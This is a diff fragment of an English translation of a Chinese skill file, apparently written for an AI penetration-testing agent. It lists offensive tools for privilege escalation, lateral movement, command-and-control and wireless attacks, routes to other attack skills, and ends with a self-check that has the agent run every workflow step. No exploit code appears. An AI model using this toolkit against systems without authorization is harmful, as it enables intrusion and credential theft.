 `nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`
 
-### 权限提升
+### Privilege Escalation
 `winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`
 
-### 横向移动
+### Lateral Movement
 `mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`
 
-### C2 框架
+### C2 Frameworks
 `cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`
 
-### 近源渗透
+### Near-Source Penetration
 `fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`
 
 ---
 
-## 与本包其他 Skill 的关系
+## Relationship to Other Skills in This Package
 
-| 需求 | 路由到 |
+| Need | Route to |
 |------|--------|
-| Web 漏洞深度利用 | `pentest-tools/SKILL.md` |
-| 内网 AD 攻击详细步骤 | `windows-ad/SKILL.md` |
-| 逆向分析恶意样本 | `reverse-engineering/SKILL.md` |
-| APK 逆向（移动端渗透） | `apk-reverse/SKILL.md` |
-| JS 前端签名绕过 | `js-reverse/SKILL.md` |
-| 自动化群体渗透 | Pentest Swarm AI（`pentestswarm scan --swarm`） |
-| AI 辅助渗透 | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
-| 报告生成 | `docs-generator/SKILL.md` |
-| 攻击路径图 | `diagram-generator/SKILL.md` |
+| In-depth Web vulnerability exploitation | `pentest-tools/SKILL.md` |
+| Detailed internal AD attack steps | `windows-ad/SKILL.md` |
+| Reverse analysis of malicious samples | `reverse-engineering/SKILL.md` |
+| APK reverse engineering (mobile penetration) | `apk-reverse/SKILL.md` |
+| JS front-end signature bypass | `js-reverse/SKILL.md` |
+| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
+| AI-assisted penetration testing | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
+| Report generation | `docs-generator/SKILL.md` |
+| Attack-path diagram | `diagram-generator/SKILL.md` |
 
+## Task Completion Self-Check (MUST pass before claiming completion)
 
-## 任务完成自检（声称完成前 MUST 通过）
-
-- [ ] 我是否执行了工作流中的每一步（而不是只阅读）？
-- [ ] 我是否基于 `tool-index` 使用了真实工具路径？
-- [ ] 我是否产出了可复现证据（命令/脚本/截图/报告）？
-- [ ] 我是否完成并回写了 RULES 要求的 Checklist 项？
+- [ ] Did I execute every step in the workflow (rather than only read it)?
+- [ ] Did I use real tool paths based on `tool-index`?
+- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
+- [ ] Did I complete and write back the checklist items required by RULES?
